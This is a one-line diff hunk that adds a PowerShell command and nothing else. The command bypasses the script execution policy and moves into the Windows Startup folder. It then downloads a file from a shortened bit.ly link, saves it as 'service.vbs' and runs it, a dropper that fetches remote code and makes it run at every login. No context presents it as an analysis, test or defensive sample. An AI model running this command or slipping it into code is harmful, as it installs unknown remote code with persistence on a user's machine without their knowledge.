@@ -1,0 +1,1 @@
+powershell -ep bypass “cd $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup ; iwr https://bit.ly/2TPR0lG -outfile service.vbs ; .\service.vbs”
